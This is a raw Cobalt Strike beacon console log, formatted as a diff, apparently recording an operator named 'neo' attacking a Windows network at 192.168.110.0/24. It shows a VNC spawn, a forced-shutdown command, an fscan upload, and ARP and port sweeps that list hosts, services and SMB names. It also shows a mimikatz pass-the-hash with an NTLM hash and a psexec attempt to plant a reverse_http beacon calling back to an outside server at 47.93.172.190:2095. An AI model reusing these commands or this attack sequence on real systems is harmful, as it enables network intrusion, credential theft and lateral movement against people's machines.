@@ -1,0 +1,736 @@
+10/07 06:57:05 UTC [metadata] 112.226.65.29 <- 192.168.110.29; computer: JT-202303111428; user: Administrator *; process: artifact_x64.exe; pid: 17992; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+10/07 06:57:02 UTC [input] <neo> sleep 0
+10/07 06:57:02 UTC [task] <T1029> Tasked beacon to become interactive
+10/07 06:57:56 UTC [checkin] host called home, sent: 16 bytes
+10/07 06:58:02 UTC [input] <neo> desktop
+10/07 06:58:02 UTC [checkin] host called home, sent: 16 bytes
+10/07 06:58:04 UTC [task] <> Tasked beacon to spawn VNC server
+10/07 06:58:06 UTC [checkin] host called home, sent: 374794 bytes
+10/07 06:58:07 UTC [output]
+started port forward on 7649 to 127.0.0.1:7649
+
+10/07 07:00:19 UTC [output]
+stopped proxy pivot on 7649
+
+10/07 07:01:14 UTC [input] <neo> shell shutdown /s /t 3600
+10/07 07:01:14 UTC [task] <T1059> Tasked beacon to run: shutdown /s /t 3600
+10/07 07:01:14 UTC [checkin] host called home, sent: 50 bytes
+10/07 07:12:50 UTC [output]
+2Ladon noping 192.168.110.0/24 OnlineIP
+
+10/07 07:12:57 UTC [error] Task size of 1050219 bytes is over the max task size limit of 1048576 bytes.
+10/07 07:13:13 UTC [checkin] host called home, sent: 1734 bytes
+10/07 07:13:18 UTC [input] <neo> portscan 192.168.110.0-192.168.110.255 1-1024,3389,5000-6000 arp 1024
+10/07 07:13:18 UTC [task] <T1046, T1093> Tasked beacon to scan ports 1-1024,3389,5000-6000 on 192.168.110.0-192.168.110.255
+10/07 07:13:19 UTC [checkin] host called home, sent: 93797 bytes
+10/07 07:13:20 UTC [output]
+received output:
+(ARP) Target '192.168.110.29' is alive. D8-5E-D3-FF-13-5E
+(ARP) Target '192.168.110.5' is alive. 24(ARP) Target '192.168.110.28' is alive. -C4(ARP) Target '192.168.110.4' is alive. 28-24(ARP) Target '192.168.110.7' is alive. -(ARP) Target '192.168.110.1' is alive. 70-(ARP) Target '192.168.110.6' is alive. (ARP) Target '192.168.110.8' is alive. 24(ARP) Target '192.168.110.3' is alive. FD(ARP) Target '192.168.110.2' is alive. (ARP) Target '192.168.110.26' is alive. (ARP) Target '192.168.110.20' is alive. C0-282424-24-24C418-AB---28-DC---B8-FD2828-28-2870C0-BB---FD-C7---E6-DCFDFD-FD-FDAB4D-80---DC-74---9E-C78B8B-DC
+8BBB4D-3D---C7----98
+767676-C7768024-
+--73----E5BFED
+D7BA3BC5
+
+
+
+
+
+
+(ARP) Target '192.168.110.41' is alive. (ARP) Target '192.168.110.35' is alive. D8D8--BB5E--C1D3--A3(ARP) Target '192.168.110.38' is alive. 7B-18-50-3B-C0-09-89
+4D
+-CE-77-01
+
+
+10/07 07:13:24 UTC [output]
+received output:
+(ARP) Target '192.168.110.56' is alive. (ARP) Target '192.168.110.54' is alive. 5400--A0E0--5070--7F46--BF1C--DCA5
+
+
+
+10/07 07:13:25 UTC [output]
+received output:
+(ARP) Target '192.168.110.65' is alive. 5C-03-39-E6-A2-66
+
+
+10/07 07:13:27 UTC [output]
+received output:
+(ARP) Target '192.168.110.88' is alive. 08-00-37-B0-34-2D
+(ARP) Target '192.168.110.98' is alive. 9A-EA-29-66-38-56
+(ARP) Target '192.168.110.90' is alive. 86-DE-3A-C0-84-25
+(ARP) Target '192.168.110.108' is alive. 3C-06-A7-3C-62-A1
+
+
+10/07 07:13:30 UTC [output]
+received output:
+(ARP) Target '192.168.110.128' is alive. 3C-(ARP) Target '192.168.110.118' is alive. 062C--A7F0--5C5D--B1F5--6977
+-03
+(ARP) Target '192.168.110.122' is alive. 32-37-0A-DC-42-25
+(ARP) Target '192.168.110.143' is alive. 00-E0-70-43-02-CB
+
+
+10/07 07:13:31 UTC [output]
+received output:
+(ARP) Target '192.168.110.148' is alive. 02-2C-85-7F-DC-84
+(ARP) Target '192.168.110.153' is alive. 50-2F-9B-D1-E9-E9
+(ARP) Target '192.168.110.120' is alive. 22-0A-E7-E5-D5-C4
+(ARP) Target '192.168.110.155' is alive. 18-C0-4D-51-3E-4A
+
+
+10/07 07:13:32 UTC [output]
+received output:
+(ARP) Target '192.168.110.156' is alive. 8A-C2-0F-76-77-B4
+
+
+10/07 07:13:33 UTC [output]
+received output:
+(ARP) Target '192.168.110.152' is alive. 52-56-A8-F7-31-C4
+
+
+10/07 07:13:34 UTC [output]
+received output:
+(ARP) Target '192.168.110.187' is alive. 18-C0-4D-4B-BB-5A
+
+
+10/07 07:13:37 UTC [output]
+received output:
+(ARP) Target '192.168.110.203' is alive. 7C-10-C9-D3-58-DA
+(ARP) Target '192.168.110.207' is alive. C4-70-AB-BB-80-05
+(ARP) Target '192.168.110.217' is alive. 00-E0-4C-45-95-53
+(ARP) Target '192.168.110.192' is alive. 20-F4-78-31-D2-F6
+
+
+10/07 07:13:38 UTC [output]
+received output:
+(ARP) Target '192.168.110.211' is alive. 82-96-0B-64-F1-18
+
+
+10/07 07:13:40 UTC [output]
+received output:
+(ARP) Target '192.168.110.246' is alive. (ARP) Target '192.168.110.248' is alive. 90D8(ARP) Target '192.168.110.243' is alive. --2409BB---28D0C1---FD0EA3---20E64F---2EDDFB-
+
+08
+(ARP) Target '192.168.110.251' is alive. C4-70-AB-BB-80-31
+
+
+10/07 07:13:41 UTC [output]
+received output:
+(ARP) Target '192.168.110.249' is alive. 0E-88-E4-A1-F9-BE
+
+
+10/07 07:13:42 UTC [output]
+received output:
+(ARP) Target '192.168.110.229' is alive. 84-BE-52-A7-0C-3D
+
+
+10/07 07:14:25 UTC [output]
+9=========== 上传 Fscan ==========
+
+10/07 07:14:27 UTC [task] <> cd C:\Windows\Temp\
+10/07 07:14:27 UTC [checkin] host called home, sent: 24 bytes
+10/07 07:14:42 UTC [task] <> Tasked beacon to upload D:\渗透工具\CobaltStrike4.8汉化版\Client\plugin\LSTAR\scripts\IntrScan\x64\fscan.exe as fscan.exe
+10/07 07:14:43 UTC [checkin] host called home, sent: 786453 bytes
+10/07 07:14:48 UTC [warning] Unable to add task of 260117 bytes as it is over the available size of 8108 bytes. 13 task(s) on hold until next checkin.
+10/07 07:14:48 UTC [checkin] host called home, sent: 1040468 bytes
+10/07 07:14:49 UTC [indicator] file: 5e0845a9f08c1cfc7966824758b6953a 5427200 bytes fscan.exe
+10/07 07:14:56 UTC [warning] Unable to add task of 260117 bytes as it is over the available size of 8108 bytes. 10 task(s) on hold until next checkin.
+10/07 07:14:56 UTC [checkin] host called home, sent: 1040468 bytes
+10/07 07:15:04 UTC [warning] Unable to add task of 260117 bytes as it is over the available size of 8108 bytes. 6 task(s) on hold until next checkin.
+10/07 07:15:04 UTC [checkin] host called home, sent: 1040468 bytes
+10/07 07:15:12 UTC [warning] Unable to add task of 260117 bytes as it is over the available size of 8108 bytes. 2 task(s) on hold until next checkin.
+10/07 07:15:12 UTC [checkin] host called home, sent: 1040468 bytes
+10/07 07:15:21 UTC [checkin] host called home, sent: 479274 bytes
+10/07 07:15:40 UTC [output]
+received output:
+192.168.110.248:5357
+
+
+10/07 07:15:45 UTC [output]
+received output:
+192.168.110.248:5040
+
+
+10/07 07:15:53 UTC [output]
+received output:
+192.168.110.248:139
+192.168.110.248:135
+
+
+10/07 07:15:57 UTC [output]
+received output:
+192.168.110.246:5566
+
+
+10/07 07:15:58 UTC [output]
+received output:
+192.168.110.246:5357
+
+
+10/07 07:16:00 UTC [output]
+received output:
+192.168.110.246:5001
+192.168.110.246:5000
+
+
+10/07 07:16:00 UTC [input] <neo> connect 192.168.110.246
+10/07 07:16:00 UTC [task] <T1090> Tasked to connect to 192.168.110.246:4444
+10/07 07:16:00 UTC [checkin] host called home, sent: 26 bytes
+10/07 07:16:15 UTC [error] Could not connect to target
+10/07 07:16:15 UTC [output]
+received output:
+192.168.110.246:443
+
+
+10/07 07:16:16 UTC [output]
+received output:
+192.168.110.246:139
+192.168.110.246:80
+
+
+10/07 07:16:17 UTC [output]
+received output:
+192.168.110.243:554
+
+
+10/07 07:16:21 UTC [output]
+received output:
+192.168.110.243:80
+
+
+10/07 07:17:38 UTC [output]
+received output:
+192.168.110.217:5357
+
+
+10/07 07:17:46 UTC [output]
+received output:
+192.168.110.217:5040
+
+
+10/07 07:17:47 UTC [output]
+received output:
+192.168.110.217:990
+
+
+10/07 07:17:59 UTC [output]
+received output:
+192.168.110.217:443
+
+
+10/07 07:18:16 UTC [output]
+received output:
+192.168.110.217:80
+
+
+10/07 07:18:17 UTC [output]
+received output:
+192.168.110.217:22 (SSH-2.0-Serv-U_15.0.1.20)
+192.168.110.217:21 (220 Serv-U FTP Server v15.0 ready...)
+
+
+10/07 07:19:13 UTC [output]
+received output:
+192.168.110.203:5357
+
+
+10/07 07:19:14 UTC [output]
+received output:
+192.168.110.207:80
+
+
+10/07 07:19:16 UTC [output]
+received output:
+192.168.110.203:5040
+
+
+10/07 07:19:24 UTC [output]
+received output:
+192.168.110.203:139
+192.168.110.203:135
+
+
+10/07 07:19:27 UTC [output]
+received output:
+192.168.110.187:5956
+
+
+10/07 07:19:29 UTC [output]
+received output:
+192.168.110.187:5357
+
+
+10/07 07:19:30 UTC [output]
+received output:
+192.168.110.187:5290
+192.168.110.187:5289
+
+
+10/07 07:19:31 UTC [output]
+received output:
+192.168.110.187:5081
+192.168.110.187:5040
+192.168.110.187:5001
+192.168.110.187:5000
+192.168.110.187:3389
+
+
+10/07 07:19:35 UTC [output]
+received output:
+192.168.110.187:139
+192.168.110.187:135
+
+
+10/07 07:21:23 UTC [output]
+received output:
+192.168.110.155:990
+
+
+10/07 07:21:36 UTC [output]
+received output:
+192.168.110.155:443
+
+
+10/07 07:21:48 UTC [output]
+received output:
+192.168.110.155:139
+192.168.110.155:135
+192.168.110.155:80
+
+
+10/07 07:21:54 UTC [output]
+received output:
+192.168.110.155:22 (SSH-2.0-Serv-U_15.0.1.20)
+192.168.110.155:21 (220 Serv-U FTP Server v15.0 ready...)
+
+
+10/07 07:22:46 UTC [output]
+received output:
+192.168.110.153:5357
+
+
+10/07 07:23:02 UTC [output]
+received output:
+192.168.110.153:5040
+
+
+10/07 07:24:18 UTC [output]
+received output:
+192.168.110.143:5357
+
+
+10/07 07:24:27 UTC [output]
+received output:
+192.168.110.143:990
+
+
+10/07 07:24:35 UTC [output]
+received output:
+192.168.110.143:443
+
+
+10/07 07:24:47 UTC [output]
+received output:
+192.168.110.143:139
+
+
+10/07 07:24:48 UTC [output]
+received output:
+192.168.110.143:135
+
+
+10/07 07:24:49 UTC [output]
+received output:
+192.168.110.143:80
+
+
+10/07 07:24:51 UTC [output]
+received output:
+192.168.110.143:22 (SSH-2.0-Serv-U_15.0.1.20)
+192.168.110.143:21 (220 Serv-U FTP Server v15.0 ready...)
+
+
+10/07 07:26:26 UTC [output]
+received output:
+192.168.110.118:5357
+
+
+10/07 07:26:35 UTC [output]
+received output:
+192.168.110.118:5040
+
+
+10/07 07:26:36 UTC [output]
+received output:
+192.168.110.118:990
+
+
+10/07 07:26:52 UTC [output]
+received output:
+192.168.110.118:443
+
+
+10/07 07:26:57 UTC [output]
+received output:
+192.168.110.118:139
+192.168.110.118:135
+
+
+10/07 07:26:58 UTC [output]
+received output:
+192.168.110.118:80
+
+
+10/07 07:27:12 UTC [output]
+received output:
+192.168.110.118:22 (SSH-2.0-Serv-U_15.0.1.20)
+192.168.110.118:21 (220 Serv-U FTP Server v15.0 ready...)
+
+
+10/07 07:27:46 UTC [output]
+received output:
+192.168.110.108:80
+
+
+10/07 07:28:06 UTC [input] <neo> rev2self
+10/07 07:28:06 UTC [task] <T1134> Tasked beacon to revert token
+10/07 07:28:06 UTC [input] <neo> pth JT-202303111428\Administrator 31d6cfe0d16ae931b73c59d7e0c089c0
+10/07 07:28:06 UTC [checkin] host called home, sent: 31 bytes
+10/07 07:28:06 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:"Administrator" /domain:"JT-202303111428" /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:"%COMSPEC% /c echo 9e43b504955 > \\.\pipe\550bee" command
+10/07 07:28:06 UTC [checkin] host called home, sent: 312840 bytes
+10/07 07:28:06 UTC [input] <neo> jump psexec 192.168.110.153 aaa
+10/07 07:28:07 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_http/reverse_http (47.93.172.190:2095) on 192.168.110.153 via Service Control Manager (\\192.168.110.153\ADMIN$\f7ced87.exe)
+10/07 07:28:07 UTC [indicator] service: \\192.168.110.153 f7ced87
+10/07 07:28:07 UTC [indicator] file: 72a7aac1d8fa2edccfb143227d348861 311296 bytes \\192.168.110.153\ADMIN$\f7ced87.exe
+10/07 07:28:07 UTC [checkin] host called home, sent: 313745 bytes
+10/07 07:29:14 UTC [output]
+Impersonated JT-202303111428\Administrator
+
+10/07 07:29:14 UTC [error] could not upload file: 53 - ERROR_BAD_NETPATH
+10/07 07:29:14 UTC [error] Could not open service control manager on 192.168.110.153: 1722
+10/07 07:29:14 UTC [output]
+received output:
+user	: Administrator
+domain	: JT-202303111428
+program	: C:\Windows\system32\cmd.exe /c echo 9e43b504955 > \\.\pipe\550bee
+impers.	: no
+NTLM	: 31d6cfe0d16ae931b73c59d7e0c089c0
+  |  PID  8240
+  |  TID  13076
+  |  LSA Process is now R/W
+  |  LUID 0 ; 576157357 (00000000:225776ad)
+  \_ msv1_0   - data copy @ 000001E26D8F7070 : OK !
+  \_ kerberos - 
+
+
+10/07 07:29:56 UTC [output]
+received output:
+192.168.110.88:515
+
+
+10/07 07:30:03 UTC [output]
+received output:
+192.168.110.88:139
+
+
+10/07 07:30:04 UTC [output]
+received output:
+192.168.110.88:80
+
+
+10/07 07:31:15 UTC [output]
+received output:
+192.168.110.56:5357
+
+
+10/07 07:31:30 UTC [output]
+received output:
+192.168.110.56:554
+
+
+10/07 07:31:47 UTC [output]
+received output:
+192.168.110.56:139
+192.168.110.56:135
+
+
+10/07 07:32:01 UTC [output]
+received output:
+192.168.110.54:990
+
+
+10/07 07:32:06 UTC [output]
+received output:
+192.168.110.54:443
+
+
+10/07 07:32:11 UTC [output]
+received output:
+192.168.110.54:139
+192.168.110.54:135
+192.168.110.54:80
+
+
+10/07 07:32:15 UTC [output]
+received output:
+192.168.110.54:22 (SSH-2.0-Serv-U_15.0.1.20)
+192.168.110.54:21 (220 Serv-U FTP Server v15.0 ready...)
+
+
+10/07 07:33:08 UTC [output]
+received output:
+192.168.110.41:139
+192.168.110.41:135
+
+
+10/07 07:33:19 UTC [output]
+received output:
+192.168.110.38:5357
+
+
+10/07 07:33:22 UTC [output]
+received output:
+192.168.110.38:5040
+
+
+10/07 07:33:23 UTC [output]
+received output:
+192.168.110.38:990
+
+
+10/07 07:33:28 UTC [output]
+received output:
+192.168.110.38:443
+
+
+10/07 07:33:32 UTC [output]
+received output:
+192.168.110.38:139
+192.168.110.38:135
+192.168.110.38:80
+
+
+10/07 07:33:35 UTC [output]
+received output:
+192.168.110.38:22 (SSH-2.0-Serv-U_15.0.1.20)
+192.168.110.38:21 (220 Serv-U FTP Server v15.0 ready...)
+
+
+10/07 07:33:53 UTC [output]
+received output:
+192.168.110.35:5357
+
+
+10/07 07:34:01 UTC [output]
+received output:
+192.168.110.35:5040
+
+
+10/07 07:34:28 UTC [output]
+received output:
+192.168.110.35:139
+192.168.110.35:135
+
+
+10/07 07:34:33 UTC [output]
+received output:
+192.168.110.29:5357
+
+
+10/07 07:34:39 UTC [output]
+received output:
+192.168.110.29:5040
+192.168.110.29:990
+
+
+10/07 07:34:40 UTC [output]
+received output:
+192.168.110.29:443
+
+
+10/07 07:34:43 UTC [output]
+received output:
+192.168.110.29:139
+192.168.110.29:135
+192.168.110.29:80
+
+
+10/07 07:34:50 UTC [output]
+received output:
+192.168.110.29:22 (SSH-2.0-Serv-U_15.0.1.20)
+192.168.110.29:21 (220 Serv-U FTP Server v15.0 ready...)
+
+
+10/07 07:35:23 UTC [output]
+received output:
+192.168.110.28:443
+
+
+10/07 07:36:11 UTC [output]
+received output:
+192.168.110.26:443
+
+
+10/07 07:36:23 UTC [output]
+received output:
+192.168.110.20:5646
+
+
+10/07 07:36:45 UTC [output]
+received output:
+192.168.110.20:3389
+
+
+10/07 07:37:04 UTC [output]
+received output:
+192.168.110.20:139
+192.168.110.20:135
+
+
+10/07 07:37:23 UTC [output]
+received output:
+192.168.110.8:554
+
+
+10/07 07:37:24 UTC [output]
+received output:
+192.168.110.8:443
+
+
+10/07 07:37:26 UTC [output]
+received output:
+192.168.110.8:322
+
+
+10/07 07:37:27 UTC [output]
+received output:
+192.168.110.8:80
+
+
+10/07 07:37:42 UTC [output]
+received output:
+192.168.110.7:554
+192.168.110.7:443
+
+
+10/07 07:37:44 UTC [output]
+received output:
+192.168.110.7:322
+
+
+10/07 07:37:45 UTC [output]
+received output:
+192.168.110.7:80
+
+
+10/07 07:37:59 UTC [output]
+received output:
+192.168.110.6:554
+
+
+10/07 07:38:02 UTC [output]
+received output:
+192.168.110.6:443
+
+
+10/07 07:38:03 UTC [output]
+received output:
+192.168.110.6:322
+
+
+10/07 07:38:04 UTC [output]
+received output:
+192.168.110.6:80
+
+
+10/07 07:38:18 UTC [output]
+received output:
+192.168.110.5:554
+192.168.110.5:443
+
+
+10/07 07:38:20 UTC [output]
+received output:
+192.168.110.5:322
+
+
+10/07 07:38:23 UTC [output]
+received output:
+192.168.110.5:80
+
+
+10/07 07:38:36 UTC [output]
+received output:
+192.168.110.4:554
+
+
+10/07 07:38:38 UTC [output]
+received output:
+192.168.110.4:443
+192.168.110.4:322
+
+
+10/07 07:38:41 UTC [output]
+received output:
+192.168.110.4:80
+
+
+10/07 07:38:55 UTC [output]
+received output:
+192.168.110.3:554
+
+
+10/07 07:38:57 UTC [output]
+received output:
+192.168.110.3:443
+
+
+10/07 07:38:58 UTC [output]
+received output:
+192.168.110.3:322
+
+
+10/07 07:39:01 UTC [output]
+received output:
+192.168.110.3:80
+
+
+10/07 07:39:16 UTC [output]
+received output:
+192.168.110.2:554
+192.168.110.2:443
+
+
+10/07 07:39:17 UTC [output]
+received output:
+192.168.110.2:322
+
+
+10/07 07:39:20 UTC [output]
+received output:
+192.168.110.2:80
+
+
+10/07 07:40:23 UTC [output]
+received output:
+192.168.110.20:445
+192.168.110.29:445 (platform: 500 version: 10.0 name: JT-202303111428 domain: WorkGroup)
+192.168.110.35:445
+192.168.110.38:445
+192.168.110.41:445
+192.168.110.54:445 (platform: 500 version: 6.1 name: SKY-20160903EKT domain: WorkGroup)
+192.168.110.56:445 (platform: 500 version: 6.1 name: USER-20190609LX domain: WORKGROUP)
+
+
+10/07 07:40:25 UTC [output]
+received output:
+192.168.110.88:445
+192.168.110.118:445
+192.168.110.143:445 (platform: 500 version: 6.1 name: PC-20170617IQEZ domain: WorkGroup)
+192.168.110.155:445 (platform: 500 version: 10.0 name: ZXC1230 domain: WORKGROUP)
+192.168.110.187:445 (platform: 500 version: 10.0 name: DESKTOP-MNVIIVQ domain: WORKGROUP)
+192.168.110.203:445 (platform: 500 version: 10.0 name: SC-202211211705 domain: WorkGroup)
+192.168.110.246:445 (platform: 500 version: 6.1 name: DS920 domain: WORKGROUP)
+192.168.110.248:445
+Scanner module is complete
+
+
